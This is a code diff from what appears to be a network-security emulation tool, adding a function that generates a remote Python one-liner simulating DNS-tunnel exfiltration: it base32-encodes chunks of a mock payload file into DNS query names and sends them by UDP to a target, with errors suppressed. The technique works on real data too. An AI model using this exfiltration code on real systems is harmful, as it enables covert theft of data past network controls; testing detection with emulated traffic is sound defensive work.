@@ -5,6 +5,14 @@ from __future__ import annotations
 import base64
 import re
 import shlex
+from typing import Any
+
+from dsp.protocols.dns.tunnel import (
+    CHUNK_SIZE_DEFAULT,
+    MOCK_PAYLOAD_FILENAME,
+    MOCK_PAYLOAD_PATTERN,
+    SEND_INTERVAL_SEC,
+)
 
 
 def mock_noop_command() -> str:
@@ -208,6 +216,80 @@ def dns_query_command(
     if suppress_errors:
         return f"{command} 2>/dev/null || true"
     return command
+
+
+def dns_tunnel_session_command(
+    target: str,
+    *,
+    payload_mb: float,
+    chunk_size: int = CHUNK_SIZE_DEFAULT,
+    domain: str,
+    mock_filename: str = MOCK_PAYLOAD_FILENAME,
+    send_interval: float = SEND_INTERVAL_SEC,
+    suppress_errors: bool = True,
+) -> str:
+    """Run full DNS tunnel exfil session on remote host — sendto only, no DNS recv."""
+    script = (
+        "import base64,os,socket,struct,time,uuid,tempfile;"
+        f"T={target!r};D={domain!r};F={mock_filename!r};C={int(chunk_size)};"
+        f"M={float(payload_mb)};I={float(send_interval)};P={MOCK_PAYLOAD_PATTERN!r};"
+        "def b32(x):return base64.b32encode(x).decode().lower().rstrip('=');"
+        "def qn(n):"
+        " o=b'';"
+        " [o:=o+struct.pack('B',len(l))+l.encode() for l in n.rstrip('.').split('.')];"
+        " return o+b'\\x00';"
+        "def mk(f):"
+        " i=struct.unpack('!H',uuid.uuid4().bytes[:2])[0];"
+        " return struct.pack('!HHHHHH',i,0x0100,1,0,0,0)+qn(f)+struct.pack('!HH',1,1);"
+        "def pay():"
+        " t=max(C,int(M*1024*1024));return (P*((t+len(P)-1)//len(P)))[:t];"
+        "def snd(s,fq):s.sendto(mk(fq),(T,53));"
+        "with tempfile.TemporaryDirectory() as td:"
+        " fp=os.path.join(td,F);open(fp,'wb').write(pay());"
+        " s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
+        " snd(s,'strt-'+b32(F.encode())+'.'+D);"
+        " seq=0;"
+        " with open(fp,'rb') as fh:"
+        "  while True:"
+        "   ch=fh.read(C);"
+        "   if not ch:break;"
+        "   snd(s,'idx-'+format(seq,'04d')+'-'+b32(ch)+'.'+D);"
+        "   seq+=1;"
+        "   if I>0:time.sleep(I);"
+        " snd(s,'end-0.'+D);s.close();"
+        "print('DNS_TUNNEL_SESSION_DONE')"
+    )
+    command = f"python3 -c {shlex.quote(script)}"
+    if suppress_errors:
+        return f"{command} 2>/dev/null || true"
+    return command
+
+
+def dns_tunnel_session_command_evidence(
+    target: str,
+    *,
+    payload_mb: float,
+    chunk_size: int = CHUNK_SIZE_DEFAULT,
+    domain: str,
+    mock_filename: str = MOCK_PAYLOAD_FILENAME,
+    send_interval: float = SEND_INTERVAL_SEC,
+    suppress_errors: bool = True,
+) -> dict[str, Any]:
+    """Metadata for a full remote DNS tunnel session command."""
+    command = dns_tunnel_session_command(
+        target,
+        payload_mb=payload_mb,
+        chunk_size=chunk_size,
+        domain=domain,
+        mock_filename=mock_filename,
+        send_interval=send_interval,
+        suppress_errors=suppress_errors,
+    )
+    return {
+        "dns_query_method": DNS_QUERY_METHOD,
+        "remote_command": command,
+        "execution_mode": "dns_tunnel_session",
+    }
 
 
 def dns_query_command_evidence(
